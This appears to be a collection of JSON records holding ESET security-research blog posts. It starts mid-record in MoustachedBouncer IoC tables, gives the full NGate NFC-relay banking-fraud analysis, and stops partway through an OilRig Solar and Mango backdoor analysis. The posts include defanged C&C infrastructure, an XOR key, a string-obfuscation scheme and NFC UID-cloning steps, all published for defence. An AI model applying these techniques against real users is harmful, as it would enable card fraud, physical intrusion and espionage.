plugin).\n| C&C servers | IP | Domain | First seen | Comment | | 185.87.148[.]86 | centrocspupdate[.]com | November 3, 2021 | Suspected NightClub C&C server.\n| | 185.87.151[.]130 | ocsp-atomsecure[.]com | November 11, 2021 | Suspected NightClub C&C server.\n| | 45.136.199[.]67 | securityocspdev[.]com | July 5, 2022 | NightClub C&C server.\n| | 45.136.199[.]129 | dervasopssec[.]com | October 12, 2022 | Suspected NightClub C&C server.\n| “Fake” domains used in AitM Note: These domains are used in a context where DNS queries are intercepted before reaching the internet.\nThey do not resolve outside the context of the AitM attack.\nwindows.network.troubleshooter[.]com updates.microsoft[.]com SMB share IP addresses while AitM is ongoing Note: These IP addresses are used in a context where traffic to them is intercepted before reaching the internet.\nThese internet-routable IP addresses are not malicious outside the context of the AitM attack.\n24.9.51[.]94 35.214.56[.]2 38.9.8[.]78 52.3.8[.]25 59.6.8[.]25 209.19.37[.]184 Email addresses fhtgbbwi@mail[.]ru nvjfnvjfnjf@mail[.]ru glen.morriss75@seznam[.]cz SunyaF@seznam[.]cz MITRE ATT&CK techniques This table was built using version 13 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Reconnaissance | Gather Victim Network Information: IP Addresses | MoustachedBouncer operators have collected IP addresses, or address blocks, of their targets in order to modify network traffic for just those addresses.\n| | | Initial Access | Drive-by Compromise | Disco is delivered via a fake Windows Update website.\n| | | Execution | User Execution: Malicious File | Disco needs to be manually executed by the victim.\n| | | Persistence | Scheduled Task/Job: Scheduled Task | Disco persists as a scheduled task that downloads an executable from a “fake” SMB share every minute.\n| | | Create or Modify System Process: Windows Service | NightClub persists as a ServiceDll of a service named WmdmPmSp.\n| || | Privilege Escalation | Exploitation for Privilege Escalation | Disco has a plugin to exploit the CVE-2021-1732 local privilege escalation vulnerability.\n| | | Defense Evasion | Deobfuscate/Decode Files or Information | Since 2020, NightClub has used an external configuration file encrypted with RSA.\n| | | Collection | Data from Local System | NightClub steals recent files from the local system.\n| | | Data from Removable Media | NightClub steals files from the local system.\n| || | Input Capture: Keylogging | NightClub has a plugin to record keystrokes.\n| || | Screen Capture | NightClub and Disco each have a plugin to take screenshots.\n| || | Audio Capture | NightClub has a plugin to record audio.\n| || | Command and Control | Application Layer Protocol: File Transfer Protocols | Disco communicates via the SMB protocol.\n| | | Application Layer Protocol: Mail Protocols | NightClub communicates via the SMTP protocol.\n| || | Application Layer Protocol: DNS | One of the NightClub plugins is a backdoor that communicates via DNS.\n| || | Data Encoding: Standard Encoding | NightClub encodes files, attached to email, in base64.\n| || | Data Encoding: Non-Standard Encoding | NightClub encodes commands and responses sent via its DNS C&C channel with a modified form of base64.\n| || | Encrypted Channel: Symmetric Cryptography | NightClub receives plugins in email attachments, encrypted using AES-CBC.\n| || | Adversary-in-the-Middle | MoustachedBouncer has performed AitM at the ISP level to redirect its targets to a fake Windows Update page.\nIt has also done AitM on the SMB protocol to deliver malicious files from “fake” servers.\n| || | Exfiltration | Exfiltration Over C2 Channel | NightClub and Disco exfiltrate data over the C&C channel (SMTP, SMB, and DNS).\n| | | Impact | Data Manipulation: Transmitted Data Manipulation | MoustachedBouncer has modified the HTTP traffic from specific IP addresses at the ISP level in order to redirect its targets to a fake Windows Update page.\n|","num_sentences":364,"metadata":{"source":"blog","platform":"welivesecurity","filename":"moustachedbouncer"}}
{"id":211,"title":"NGate Android malware relays NFC traffic to steal cash","publish_date":"2024-08-22","link":"https://www.welivesecurity.com/en/eset-research/ngate-android-malware-relays-nfc-traffic-to-steal-cash/","clean_text":"ESET researchers uncovered a crimeware campaign that targeted clients of three Czech banks.\nThe malware used, which we have named NGate, has the unique ability to relay data from victims’ payment cards, via a malicious app installed on their Android devices, to the attacker’s rooted Android phone.\nKey points of this blogpost: - Attackers combined standard malicious techniques – social engineering, phishing, and Android malware – into a novel attack scenario; we suspect that lure messages were sent to random phone numbers and caught customers of three banks. -\nAccording to ESET Brand Intelligence Service data, the group has operated since November 2023 in Czechia, using malicious progressive web apps (PWAs) and WebAPKs.\nIn March 2024 the group’s technique improved by deploying the NGate Android malware. -\nAttackers were able to clone NFC data from victims’ physical payment cards using NGate and relay this data to an attacker device that was then able to emulate the original card and withdraw money from an ATM. -\nThis is the first time we have seen Android malware with this capability being used in the wild. -\nVictims didn’t have to root their devices.\nThe primary goal of this campaign is to facilitate unauthorized ATM withdrawals from the victims’ bank accounts.\nThis was achieved by relaying the near field communication (NFC) data from the victims’ physical payment cards, via their compromised Android smartphones by using the NGate Android malware, to the attacker’s device.\nThe attacker then used this data to perform ATM transactions.\nIf this method failed, the attacker had a fallback plan to transfer funds from the victims’ accounts to other bank accounts.\nWe haven’t seen this novel NFC relay technique in any previously discovered Android malware.\nThe technique is based on a tool called NFCGate, designed by students at the Technical University of Darmstadt, Germany, to capture, analyze, or alter NFC traffic; therefore, we named this new malware family NGate.\nOverview Victims downloaded and installed the malware after being deceived into thinking they were communicating with their bank and that their device was compromised.\nIn reality, the victims had unknowingly compromised their own Android devices by previously downloading and installing an app from a link in a deceptive SMS message about a potential tax return.\nA short description of this attack is available in the video below.\nIt’s important to note that NGate was never available on the official Google Play store.\nNGate Android malware is related to the phishing activities of a threat actor that operated in Czechia since November 2023.\nHowever, we believe these activities were put on hold following the arrest of a suspect in March 2024.\nWe first noticed the threat actor targeting clients of prominent Czech banks starting at the end of November 2023.\nThe malware was delivered via short-lived domains impersonating legitimate banking websites or official mobile banking apps available on the Google Play store, as illustrated in Figure 1.\nThese fraudulent domains were identified through the ESET Brand Intelligence Service, which provides monitoring of threats targeting a client’s brand.\nDuring the same month, we reported our findings to our clients.\nVictimology During our investigation, we identified six different NGate apps specifically targeting clients of three banks in Czechia between November 2023 and March 2024.\nIn a substantial breakthrough, the Czech police apprehended a 22-year-old, who had been stealing money from ATMs in Prague.\nUpon arrest, the suspect had 160,000 Czech korunas in his possession, an amount equivalent to over 6,000 euros (approximately US$6,500).\nThe nationality of the arrested individual has not been disclosed.\nAccording to the Czech police, the money recovered from the suspect was stolen from just the last three victims, so it is likely that the total amount stolen by the threat actor behind this scheme is considerably higher.\nEvolution of attack scenarios The attackers leveraged the potential of progressive web apps (PWAs), only to later refine their strategies by employing a more sophisticated version of PWAs known as WebAPKs.\nEventually, the operation culminated in the deployment of NGate malware.\nIt is important to note that in all of the attack scenarios described here, the victim’s device doesn’t need to be rooted, only the attacker’s device that emulates the received NFC traffic.\nProgressive web apps Initially, these fraudulent websites misused PWA technology.\nThis technology allows a user to install an app from a website via a supported browser; the installation can be triggered either automatically through a pop-up notification or manually by selecting the Install app option from the browser’s menu.\nOn Android, supported browsers include Chrome, Firefox, Edge, and Opera.\nOnce installed, a new icon featuring a small browser logo in the bottom right corner is added to the smartphone’s home screen, basically serving as a website link.\nAn example is shown in Figure 2, where we compare the icon of a PWA on the left side with an icon of a standard app on the right side.\nPWAs are essentially a type of app, but unlike traditional apps that are downloaded and installed from an app store, PWAs are accessed and used directly within a web browser.\nThey are built using common web programming languages such as HTML (for structure), CSS (for design), and JavaScript (for interactivity), which are the same technologies used to create websites.\nPWAs are known for their compatibility and flexibility, as they are designed to work on any device that has a standards-compliant web browser.\nThis means that a user, whether on a desktop computer, laptop, tablet, or smartphone, can access the same PWA without needing to download a separate app for each device.\nIf a PWA is installed from a phishing website, its icon is likely to mimic that of a legitimate banking application, with the slight addition of a small browser icon.\nUpon launching this malicious PWA, a full-screen phishing website is displayed that requests the user’s banking credentials.\nWebAPKs Subsequently, the threat actor improved on this attack scenario, continuing to target clients of the same banks as before but employing a more advanced type of PWA known as a WebAPK.\nWebAPKs are Android apps that are automatically generated by the Chrome browser when users add a PWA to their Android device’s home screen.\nTo distinguish between these two, PWAs are apps built using web technologies, while WebAPKs use a technology to integrate PWAs as native Android apps.\nWhat’s different about WebAPKs is that they appear more like native Android apps than typical PWAs, because their icons do not have the small browser logo that PWA icons have.\nThis absence of a browser logo can lead a user to mistakenly believe that a malicious WebAPK is a legitimate app, as illustrated in Figure 3.\nThe distribution scheme stayed the same – users were able to download and install a standalone app from phishing websites, instead of merely a PWA web shortcut.\nThe WebAPK requires manual installation; however, the user is not requested to grant explicit permission to install apps from unknown sources or to allow the browser to install unknown apps, as this is not a regular app.\nBecause of that, users might not be aware that they are installing an app from an untrusted source.\nFigure 4 shows an example of what it looks like when users visit a phishing website that asks them to update and install a malicious WebAPK.\nOnce it is installed and opened, the malicious app requests banking credentials.\nMore details about phishing campaigns that use PWAs and WebAPKs were discussed in our previous blogpost.\nNGate malware On March 6th, 2024 we discovered that NGate Android malware became available on the same distribution domains that were previously used to facilitate phishing campaigns delivering malicious PWAs and WebAPKs.\nAfter being installed and opened, NGate displays a fake website that asks for the user’s banking information, which is then sent to the attacker’s server.\nIn addition to its phishing capabilities, NGate malware also comes with a tool called NFCGate, which is misused to relay NFC data between two devices – the device of a victim and the device of a perpetrator.\nThe NFCGate tool was developed by students from the Secure Mobile Networking Lab at the Technical University of Darmstadt in Germany and is available on GitHub.\nNFCGate’s main function is to transmit an NFC signal from one Android device through a server to another Android device that can mimic or emulate it, as depicted in Figure 5.\nNFCGate is a tool that can interact with NFC traffic on a device.\nOn the device where NFCGate is installed, it can: 1.\nCapture NFC traffic from apps that use NFC.\n2.\nPass along or relay this NFC data from one device to another.\n3.\nMimic or replay data it has previously intercepted, on the other device.\nSome of these features work only on rooted devices; however, relaying NFC traffic is possible from non-rooted devices as well.\nThe NGate malware misuses only one of NFCGate’s features.\nIt doesn’t interfere with other data that is available on the compromised device, and doesn’t try to mimic it.\nIt abuses NFCGate only to pass along NFC data from one device to another.\nHowever, NGate also prompts its victims to enter sensitive information like their banking client ID, date of birth, and the PIN code for their banking card.\nIt also asks them to turn on the NFC feature on their smartphone.\nThen, victims are instructed to place their payment card at the back of their smartphone until the malicious app recognizes the card.\nWhat’s happening behind the scenes is that the NFC data from the victim’s bank card is being sent through a server to the attacker’s Android device.\nEssentially, this allows the attacker to mimic the victim’s bank card on their own device.\nThis means the attacker can now use this copied card data on their Android device to make payments and withdraw money from an ATMs that use NFC.\nFull attack scenario with a backup solution The announcement by the Czech police revealed the attack scenario started with the attackers sending SMS messages to potential victims about a tax return, including a link to a phishing website impersonating banks.\nThese links most likely led to malicious PWAs.\nOnce the victim installed the app and inserted their credentials, the attacker gained access to the victim’s account.\nThen the attacker called the victim, pretending to be a bank employee.\nThe victim was informed that their account had been compromised, likely due to the earlier text message.\nThe attacker was actually telling the truth – the victim’s account was compromised, but this truth then led to another lie.\nTo “protect” their funds, the victim was requested to change their PIN and verify their banking card using a mobile app – NGate malware.\nA link to download NGate was sent via SMS.\nWe suspect that within the NGate app, the victims would enter their old PIN to create a new one and place their card at the back of their smartphone to verify or apply the change.\nSince the attacker already had access to the compromised account, they could change the withdrawal limits.\nIf the NFC relay method didn’t work, they could simply transfer the funds to another account.\nHowever, using NGate makes it easier for the attacker to access the victim’s funds without leaving traces back to the attacker’s own bank account.\nA diagram of the attack sequence is shown in Figure 6.\nOther possible attack scenarios The utilization of NGate malware or a customized version of NFCGate opens up the possibility for more attack scenarios, particularly in situations where the threat actor has physical access and could potentially clone NFC tags or payment cards.\nTo perform and emulate the following possible attacks, the attacker requires a rooted and customized Android device.\nGaining access via NFC tags An NFC tag or token is a compact, contactless device that has the ability to store and transfer data.\nThese tags can serve a variety of purposes, including identification and data transfer.\nNFC tags can be used as cards for public transportation, employee ID cards for access control in buildings, wearable health/patient monitoring devices, and so on.\nEvery NFC tag has a unique ID (UID) and a data section where keys are stored.\nWhen these tags are placed near a card reader, a handshake occurs, verifying that the tag has the correct keys for authorization.\nHowever, some readers only verify the UID of the token for authorization, bypassing the need for the keys.\nThe UID is typically four bytes long.\nAny non-rooted Android device can read NFC tags that comply with ISO/IEC 14443.\nHowever, only certain rooted Androids can emulate the UID of an NFC tag.\nTherefore, if a reader verifies only the token UID, it is possible to use NFCGate to relay and emulate the tag.\nIf a reader requires also the keys (stored in the data section) for authentication, NFCGate is unable to copy them, making it impossible to clone an NFC tag in such a case.\nThis means that an attacker, either with physical access to a supported NFC tag or by tricking a user to position the tag at the back of the smartphone where this malicious app is installed, can duplicate the UID of the NFC access token.\nThis can then be used to emulate the UID and gain access to restricted areas, buildings, workplaces, and similar areas.\nDuring our testing, we successfully relayed the UID from a MIFARE Classic 1K tag, which is typically used for public transport tickets, ID badges, membership or student cards, and similar use cases.\nUsing NFCGate, it’s possible to perform an NFC relay attack to read an NFC token in one location and, in real time, access premises in a different location by emulating its UID, as shown in Figure 7.\nHowever, when we tried to emulate the UID, NFCGate sent different UIDs to the reader instead of the relayed UID.\nWe discovered that our testing device (OnePlus 7 Pro) is on the list of devices that do not support UID cloning.\nAs a result, we used the NFC Card Emulator Pro (Root) app and manually entered the UID to successfully clone it.\nThis attack scenario is highly targeted, meaning that the attacker needs to already know where the token can be used.\nSmall contactless payments via payment cards In addition to the technique used by the NGate malware, an attacker with physical access to payment cards can potentially copy and emulate them.\nThis technique could be employed by an attacker attempting to read cards through unattended purses, wallets, backpacks, or smartphone cases that hold cards, particularly in public and crowded places.\nThis scenario, however, is generally limited to making small contactless payments at terminal points, depending on the limit set by the bank that issued the card, not for ATM withdrawals, as the latter would require the attacker to have the card’s PIN.\nAnother theoretical scenario involves cloning a payment card stored in smartphone wallet apps.\nIt is possible to relay the NFC signal from Android smartphones equipped with wallet apps, such as Google Wallet.\nHowever, as of April 2024, Google requires users to provide verification for every NFC payment.\nTherefore, even with an unlocked device, a user would still need to provide verification in the Google Wallet app before making a payment.\nSimilarly, the Apple Wallet app also requests authorization before processing a payment.\nThese security measures make it more challenging to relay and emulate payment cards from the Google and Apple wallet apps, using the NFCGate tool.\nTechnical analysis of NGate malware Initial access Initial access to the device is gained by deceiving the victim into installing a malicious app, often under the guise of a false assertion that there is an overpayment of income tax that the victim can reclaim.\nThis request is typically delivered via SMS and we believe these messages were sent to random phone numbers.\nUnfortunately, we were not able to acquire samples of these SMS messages, and no screenshots were made publicly available by the Czech authorities.\nShould victims download the app and enter their credentials, the attacker then initiates a phone call, posing as a bank employee.\nThey inform the victims that their accounts have been compromised and advise them to change their PINs and verify their banking cards using a different app.\nThis new app, provided via another SMS link, contains the NGate malware.\nNone of the malicious apps we analyzed were available on Google Play.\nWe found two domains, mimicking the Czech Raiffeisenbank (as depicted in Figure 8) and the ČSOB bank, where NGate was available for download.\nAt the time of writing, none of them were active: - raiffeisen-cz[.]eu - app.mobil-csob-cz[.]eu Toolset The NGate malware displays uniform characteristics across all six samples we analyzed.\nEach sample shares the same package name (rb.system.com) and utilizes the same hardcoded phishing URL that is distinctively identified with a unique ID (found in the key query parameter) to display specific web content.\nAll samples were signed using the same developer certificate (SHA-1 fingerprint: 0C799950EC157BB775637FB3A033A502F211E62E).\nThis consistent pattern across all six samples indicates a uniformity in their development and deployment.\nAll of the samples feature the same hardcoded phishing URL (https://client.nfcpay.workers[.]dev/?key=8e9a1c7b0d4e8f2c5d3f6b2); however, each app has a distinct key associated with it.\nThis unique key corresponds to a specific banking phishing website that is displayed to the potential victim.\nThe given link serves only as a redirection to the intended phishing website.\nFrom the samples analyzed, we were able to identify five distinct phishing websites, namely: - rb.2f1c0b7d.tbc-app[.]life - geo-4bfa49b2.tbc-app[.]life - rb-62d3a.tbc-app[.]life - csob-93ef49e7a.tbc-app[.]life - george.tbc-app[.]life The icon and name of each sample has been designed to mimic specific targeted banking apps, further enhancing their deceptive appearance.\nUpon initiation, the NGate malware presents the victim with a phishing website within a WebView.\nA WebView is essentially a window or mini browser within the application itself.\nIt’s used to display web content or web pages without having to leave the application or open a separate web browser.\nIn this case, the website requests the user’s personal information, such as client ID and date of birth, as depicted in Figure 9.\nThe deceptive phishing website guides the victim to not only input the PIN code for their banking card, but also to enable the NFC feature on their device.\nThe victim is then instructed to position their card on the backside of their smartphone, setting the stage for an NFC relay attack.\nUnlike conventional malware, NGate doesn’t receive specific instructions from a Command and Control (C&C) server.\nInstead, the compromised device is controlled via the phishing website.\nThis is achieved through the use of a JavaScript interface that triggers certain Android functions.\nThese functions include retrieving information about the device such as the model and the NFC status, setting up a server to which the NFC traffic will be redirected, and initiating the NFC relay attack.\nFigure 10 illustrates a code snippet of a function that is tasked with establishing an NFC relay server and enabling the device to read and then forward NFC traffic.\nNGate uses two distinct servers to facilitate its operations.\nThe first is a phishing website designed to lure victims into providing sensitive information and capable of initiating an NFC relay attack.\nThe second is an NFCGate relay server tasked with redirecting NFC traffic from the victim’s device to the attacker’s.\nIn our initial analysis of the NGate samples, we found that the NFC server could be set based on the response from the phishing website.\nHowever, in subsequent samples, these servers appeared to be hardcoded into the NGate malware.\nIf the victim follows all the instructions issued by NGate, it results in the attacker having the ability to relay the NFC traffic from the victim’s payment card.\nThis enables the attacker to use the victim’s financial information to withdraw funds or make payments at contactless terminals.\nPrevention Ensuring safety from such complex attacks requires the use of certain protective steps against tactics like phishing, social engineering, and Android malware.\nThese steps include: - Checking the website’s authenticity.\nThis can be done by looking at the URL to make sure the website isn’t a fake version of a genuine one. -\nOnly downloading apps from official sources, such as the Google Play store.\nThis precaution significantly reduces the risk of unknowingly installing harmful software. -\nKeeping payment card PIN codes secret.\nThis important information should be kept safe at all times. -\nUsing security apps on mobile devices that can stop potentially unwanted software and malware, like NGate, from being downloaded and installed.\nThese security apps add an extra layer of defense by continuously scanning and monitoring for threats. -\nTurning off the NFC function on devices when it’s not needed.\nThis step helps to prevent any unauthorized access or data transfer via NFC. -\nUsing protective cases or protectors for radio frequency identification (RFID) cards.\nBy creating a barrier that blocks unwanted RFID scans, these can stop anyone from stealing NFC data from the card. -\nUsing digital versions of physical cards on smartphones.\nThese virtual cards are stored securely on the device and can be protected by additional security measures, such as biometric authentication, making them a safer and more convenient alternative to traditional plastic cards.\nConclusion ESET researchers have investigated a novel and unique attack scenario that combines well-known methods, such as phishing, with a new malware technique of relaying NFC traffic from victims’ physical payment cards to the attackers’ Android mobile device.\nBefore transitioning to the new malware, which we named NGate, to relay NFC traffic, the attackers formerly used PWA, then WebAPKs, to steal the banking credentials of their victims.\nThis evolution showcases the attackers’ determination and increased effort in executing their fraudulent operations.\nWhile we have identified and thoroughly examined one specific attack scenario, it is crucial to note that theoretically there could be additional misuse cases.\nThese could involve the cloning of physical cards or accessing NFC tokens, which could potentially amplify the threat and its impacts.\nThis crimeware campaign was focused on Czechia and is currently on hold, likely due to the arrest of a suspected perpetrator.\nHowever, the possibility of its expansion into other regions or countries cannot be ruled out.\nAdditionally, the arrest of one participant with substantial cash on hand provides tangible evidence of the real-world consequences of these “virtual” crimes.\nTherefore, it is essential to remain aware of social engineering tactics, stay cautious online, and use robust mobile security apps.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs A comprehensive list of Indicators of Compromise (IoCs) and samples can be found in our GitHub repository.\nFiles | SHA-1 | Filename | Detection | Description | | 7225ED2CBA9CB6C038D8 | csob_smart_klic.apk | Android/Spy.\nNGate.\nB | NGate Android malware.\n| | 66DE1E0A2E9A421DD16B | csob_smart_klic.apk | Android/Spy.\nNGate.\nC | NGate Android malware.\n| | DA84BC78FF2117DDBFDC | george_klic.apk | Android/Spy.\nNGate.\nC | NGate Android malware.\n| | E7AE59CD44204461EDBD | george_klic-0304.apk | Android/Spy.\nNGate.\nC | NGate Android malware.\n| | 103D78A180EB973B9FFC | rb_klic.apk | Android/Spy.\nNGate.\nA | NGate Android malware.\n| | 11BE9715BE9B41B1C852 | rb_klic.apk | Android/Spy.\nNGate.\nC | NGate Android malware.\n| Network | IP | Domain | Hosting provider | First seen | Details | | 91.222.136[.]153 | raiffeisen-cz[.]eu | Hosting Ukraine LTD | 2024‑03‑05 | NGate distribution website.\n| | 104.21.7[.]213 | client.nfcpay.workers[.]dev | Cloudflare, Inc. | 2024‑03‑03 | Phishing website.\n| | 172.187.98[.]211 | N/A | Divya Quamara | 2024‑04‑07 | NGate C&C server.\n| | 185.104.45[.]51 | app.mobil-csob-cz[.]eu | Hosting Ukraine LTD | 2024‑03‑12 | NGate distribution website.\n| | 185.181.165[.]124 | nfc.cryptomaker[.]info | Serverius | 2024‑02‑21 | NGate C&C server.\n| MITRE ATT&CK techniques This table was built using version 15 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Initial Access | Phishing | NGate has been distributed using dedicated websites impersonating legitimate services.\n| | | Credential Access | Input Capture: GUI Input Capture | NGate tries to obtain victims’ sensitive information via a phishing WebView pretending to be a banking service.\n| | | Discovery | System Information Discovery | NGate can extract information about the device including device model, Android version, and information about NFC.\n| | | Command and Control | Application Layer Protocol: Web Protocols | NGate uses a JavaScript interface to send and execute commands to compromised devices.\n| | | Non-Standard Port | NGate uses port 5566 to communicate with its server to exfiltrate NFC traffic.\n| || | Out of Band Data | NGate can exfiltrate NFC traffic.\n|","num_sentences":212,"metadata":{"source":"blog","platform":"welivesecurity","filename":"ngate"}}
{"id":212,"title":"OilRig’s Outer Space and Juicy Mix: Same ol’ rig, new drill pipes","publish_date":"2023-09-21","link":"https://www.welivesecurity.com/en/eset-research/oilrigs-outer-space-juicy-mix-same-ol-rig-new-drill-pipes/","clean_text":"UPDATE (June 5th, 2025): Since publishing this blogpost, we have updated our tracking to better reflect the full range and complexity of the malicious activities carried out by the OilRig APT group.\nAs a result, we are now tracking OilRig as a parent group with several subgroups.\nThe activities described in this blogpost fall under the OilRig subgroup named Lyceum.\nLyceum, also known as HEXANE or Storm-0133, is an advanced threat group that focuses on targeting various Israeli organizations, including governmental and local governmental entities and organizations in healthcare.\nMajor tools we attribute to Lyceum include DanBot, the Shark, Milan, and Marlin backdoors, Solar and Mango, OilForceGTX, and a variety of downloaders using legitimate cloud services for C&C communication.\nESET researchers have analyzed two campaigns by the OilRig APT group: Outer Space (2021), and Juicy Mix (2022).\nBoth of these cyberespionage campaigns targeted Israeli organizations exclusively, which is in line with the group’s focus on the Middle East, and used the same playbook: OilRig first compromised a legitimate website to use as a C&C server and then used VBS droppers to deliver a C#/.NET backdoor to its victims, while also deploying a variety of post-compromise tools mostly used for data exfiltration on the target systems.\nIn their Outer Space campaign, OilRig used a simple, previously undocumented C#/.NET backdoor we named Solar, along with a new downloader, SampleCheck5000 (or SC5k), that uses the Microsoft Office Exchange Web Services API for C&C communication.\nFor the Juicy Mix campaign, the threat actors improved on Solar to create the Mango backdoor, which possesses additional capabilities and obfuscation methods.\nIn addition to detecting the malicious toolset, we also notified the Israeli CERT about the compromised websites.\nKey points of this blogpost: - ESET observed two OilRig campaigns which occurred throughout 2021 (Outer Space) and 2022 (Juicy Mix). -\nThe operators exclusively targeted Israeli organizations and compromised legitimate Israeli websites for use in their C&C communications. -\nThey used a new, previously undocumented C#/.NET first-stage backdoor in each campaign: Solar in Outer Space, then its successor Mango in Juicy Mix. -\nBoth backdoors were deployed by VBS droppers, presumably spread via spearphishing emails. -\nA variety of post-compromise tools were deployed in both campaigns, notably the SC5k downloader that uses Microsoft Office Exchange Web Services API for C&C communication, and several tools to steal browser data and credentials from Windows Credential Manager.\nOilRig, also known as APT34, Lyceum, or Siamesekitten, is a cyberespionage group that has been active since at least 2014 and is commonly believed to be based in Iran.\nThe group targets Middle Eastern governments and a variety of business verticals, including chemical, energy, financial, and telecommunications.\nOilRig carried out the DNSpionage campaign in 2018 and 2019, which targeted victims in Lebanon and the United Arab Emirates.\nIn 2019 and 2020, OilRig continued attacks with the HardPass campaign, which used LinkedIn to target Middle Eastern victims in the energy and government sectors.\nIn 2021, OilRig updated its DanBot backdoor and began deploying the Shark, Milan, and Marlin backdoors, mentioned in the T3 2021 issue of the ESET Threat Report.\nIn this blogpost, we provide technical analysis of the Solar and Mango backdoors, of the VBS dropper used to deliver Mango, and of the post-compromise tools deployed in each campaign.\nAttribution The initial link that allowed us to connect the Outer Space campaign to OilRig is the use of the same custom Chrome data dumper (tracked by ESET researchers under the name MKG) as in the Out to Sea campaign.\nWe observed the Solar backdoor deploy the very same sample of MKG as in Out to Sea on the target’s system, along with two other variants.\nBesides the overlap in tools and targeting, we also saw multiple similarities between the Solar backdoor and the backdoors used in Out to Sea, mostly related to upload and download: both Solar and Shark, another OilRig backdoor, use URIs with simple upload and download schemes to communicate with the C&C server, with a “d” for download and a “u” for upload; additionally, the downloader SC5k uses uploads and downloads subdirectories just like other OilRig backdoors, namely ALMA, Shark, DanBot, and Milan.\nThese findings serve as a further confirmation that the culprit behind Outer Space is indeed OilRig.\nAs for the Juicy Mix campaign’s ties to OilRig, besides targeting Israeli organizations – which is typical for this espionage group – there are code similarities between Mango, the backdoor used in this campaign, and Solar.\nMoreover, both backdoors were deployed by VBS droppers with the same string obfuscation technique.\nThe choice of post-compromise tools employed in Juicy Mix also mirrors previous OilRig campaigns.\nOuter Space campaign overview Named for the use of an astronomy-based naming scheme in its function names and tasks, Outer Space is an OilRig campaign from 2021.\nIn this campaign, the group compromised an Israeli human resources site and subsequently used it as a C&C server for its previously undocumented C#/.NET backdoor, Solar.\nSolar is a simple backdoor with basic functionality such as reading and writing from disk, and gathering information.\nThrough Solar, the group then deployed a new downloader SC5k, which uses the Office Exchange Web Services API to download additional tools for execution, as shown in Figure 1.\nIn order to exfiltrate browser data from the victim’s system, OilRig used a Chrome-data dumper called MKG.\nJuicy Mix campaign overview In 2022 OilRig launched another campaign targeting Israeli organizations, this time with an updated toolset.\nWe named the campaign Juicy Mix for the use of a new OilRig backdoor, Mango (based on its internal assembly name, and its filename, Mango.exe).\nIn this campaign, the threat actors compromised a legitimate Israeli job portal website for use in C&C communications.\nThe group’s malicious tools were then deployed against a healthcare organization, also based in Israel.\nThe Mango first-stage backdoor is a successor to Solar, also written in C#/.NET, with notable changes that include exfiltration capabilities, use of native APIs, and added detection evasion code.\nAlong with Mango, we also detected two previously undocumented browser-data dumpers used to steal cookies, browsing history, and credentials from the Chrome and Edge browsers, and a Windows Credential Manager stealer, all of which we attribute to OilRig.\nThese tools were all used against the same target as Mango, as well as at other compromised Israeli organizations throughout 2021 and 2022.\nFigure 2 shows an overview of how the various components were used in the Juicy Mix campaign.\nTechnical analysis In this section, we provide a technical analysis of the Solar and Mango backdoors and the SC5k downloader, as well as other tools that were deployed to the targeted systems in these campaigns.\nVBS droppers To establish a foothold on the target’s system, Visual Basic Script (VBS) droppers were used in both campaigns, which were very likely spread by spearphishing emails.\nOur analysis below focuses on the VBS script used to drop Mango (SHA-1: 3699B67BF4E381847BF98528F8CE2B966231F01A); note that Solar’s dropper is very similar.\nThe dropper’s purpose is to deliver the embedded Mango backdoor, schedule a task for persistence, and register the compromise with the C&C server.\nThe embedded backdoor is stored as a series of base64 substrings, which are concatenated and base64 decoded.\nAs shown in Figure 3, the script also uses a simple string deobfuscation technique, where strings are assembled using arithmetic operations and the Chr function.\nOn top of that, Mango’s VBS dropper adds another type of string obfuscation and code to set up persistence and register with the C&C server.\nAs shown in Figure 4, to deobfuscate some strings, the script replaces any characters in the set #*+-_)(}{@$%^& with 0, then divides the string into three-digit numbers that are then converted into ASCII characters using the Chr function.\nFor example, the string 116110101109117+99111$68+77{79$68}46-50108109120115}77 translates to Msxml2.DOMDocument.\nOnce the backdoor is embedded on the system, the dropper moves on to create a scheduled task that executes Mango (or Solar, in the other version) every 14 minutes.\nFinally, the script sends a base64-encoded name of the compromised computer via a POST request to register the backdoor with its C&C server.\nSolar backdoor Solar is the backdoor used in OilRig’s Outer Space campaign.\nPossessing basic functionalities, this backdoor can be used to, among other things, download and execute files, and automatically exfiltrate staged files.\nWe chose the name Solar based on the filename used by OilRig, Solar.exe.\nIt is a fitting name since the backdoor uses an astronomy naming scheme for its function names and tasks used throughout the binary (Mercury, Venus, Mars, Earth, and Jupiter).\nSolar begins execution by performing the steps shown in Figure 5.\nThe backdoor creates two tasks, Earth and Venus, that run in memory.\nThere is no stop function for either of the two tasks, so they will run indefinitely.\nEarth is scheduled to run every 30 seconds and Venus is set to run every 40 seconds.\nEarth is the primary task, responsible for the bulk of Solar’s functions.\nIt communicates with the C&C server using the function MercuryToSun, which sends basic system and malware version information to the C&C server and then handles the server’s response.\nEarth sends the following info to the C&C server: - The string (@) ; the whole string is encrypted. -\nThe string 1.0.0.0, encrypted (possibly a version number). -\nThe string 30000, encrypted (possibly the scheduled runtime of Earth in milliseconds).\nEncryption and decryption are implemented in functions named JupiterE and JupiterD, respectively.\nBoth of them call a function named JupiterX, which implements an XOR loop as shown in Figure 6.\nThe key is derived from a hardcoded global string variable, 6sEj7*0B7#7, and a nonce: in this case, a random hex string from 2–24 characters long.\nFollowing the XOR encryption, standard base64 encoding is applied.\nAn Israeli human resources company’s web server, which OilRig compromised at some point before deploying Solar, was used as the C&C server: http://organization.co[.]il/project/templates/office/template.aspx?rt=d&sun= Prior to being appended to the URI, the encryption nonce is encrypted, and the value of the initial query string, rt, is set to d here, likely for “download”.\nThe last step of the MercuryToSun function is to process a response from the C&C server.\nIt does so by retrieving a substring of the response, which is found between the characters QQ@ and @kk.\nThis response is a string of instructions separated by asterisks (*) that is processed into an array.\nEarth then carries out the backdoor commands, which include downloading additional payloads from the server, listing files on the victim’s system, and running specific executables.\nCommand output is then gzip compressed using the function Neptune and encrypted with the same encryption key and a new nonce.\nThen the results are uploaded to the C&C server, thus: http://organization.co[.]il/project/templates/office/template.aspx?rt=u&sun= MachineGuid and the new nonce are encrypted with the JupiterE function, and here the value of rt is set to u, likely for “upload”.\nVenus, the other scheduled task, is used for automated data exfiltration.\nThis small task copies the content of files from a directory (also named Venus) to the C&C server.\nThese files are likely dropped here by some other, as yet unidentified, OilRig tool.\nAfter uploading a file, the task deletes it from disk.\nMango backdoor For its Juicy Mix campaign, OilRig switched from the Solar backdoor 